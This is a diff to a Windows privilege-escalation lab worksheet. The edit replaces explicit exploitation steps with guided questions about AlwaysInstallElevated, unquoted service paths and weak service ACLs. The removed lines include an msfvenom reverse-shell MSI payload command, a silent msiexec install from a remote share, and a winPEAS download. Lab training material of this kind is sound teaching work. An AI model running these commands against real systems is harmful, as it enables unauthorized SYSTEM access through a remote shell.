@@ -39,39 +39,26 @@ exploit the highest-confidence vector to reach SYSTEM.
 
 ## Do
 
-1. [ ] Run the triage tool against the sample data to understand the output format:
-   ```bash
-   make demo          # triage on sample (no Windows needed)
-   ```
-   Note which vectors are P0 (reliable) vs P3 (informational).
+1. [ ] On the Windows VM, run winPEAS as `labuser` (standard user) and save its output, then run
+   `triage.py` over that output on your analysis machine. (winPEAS ships a single self-contained
+   `.exe` in the PEASS-ng releases; pipe its output to a file to capture it.) Note which vectors
+   the tool ranks P0 (reliable) vs P3 (informational).
 
-2. [ ] On the Windows VM — download and run winPEAS as `labuser`:
-   ```powershell
-   # From labuser session (standard user):
-   Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe
-   .\winPEAS.exe | Out-File winpeas_out.txt
-   ```
-   Then copy `winpeas_out.txt` to your analysis machine and run:
-   ```bash
-   python3 triage.py winpeas_out.txt
-   ```
+2. [ ] From the triage output, confirm the planted vectors and identify which are P0:
+   - `AlwaysInstallElevated` registry keys
+   - the unquoted service path (`MeridianUpdater`)
+   - a weak service-binary ACL
 
-3. [ ] From the triage output, confirm the P0 vectors match what `plant-misconfigs.ps1` planted:
-   - `AlwaysInstallElevated`: both HKLM and HKCU keys set to 1
-   - Unquoted service path: `MeridianUpdater`
-   - Weak service binary ACL: `Everyone [FullControl]` on the service binary
+3. [ ] Exploit **AlwaysInstallElevated** (P0 — most reliable) to get a SYSTEM shell. (What does this
+   misconfig let any user do with an `.msi`? Which msfvenom payload/format produces one, and how do
+   you trigger an install that runs as SYSTEM?) Confirm with `whoami`.
 
-4. [ ] Exploit **AlwaysInstallElevated** (P0 — most reliable):
-   On Kali/Linux: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-IP> LPORT=4444 -f msi > shell.msi`
-   Then on the Windows VM: `msiexec /quiet /qn /i \\<your-IP>\share\shell.msi`
-   Confirm SYSTEM with: `whoami`
-
-5. [ ] Exploit the **unquoted service path** (P1):
+4. [ ] Exploit the **unquoted service path** (P1):
    - What path would Windows search before finding the real service binary?
    - Create a stub at that path and restart the service.
    - What privilege does the service run as?
 
-6. [ ] State the fix for each vector (see `triage.py` output for hints).
+5. [ ] State the fix for each vector (see `triage.py` output for hints).
 
 ## Success criteria — you're done when
 
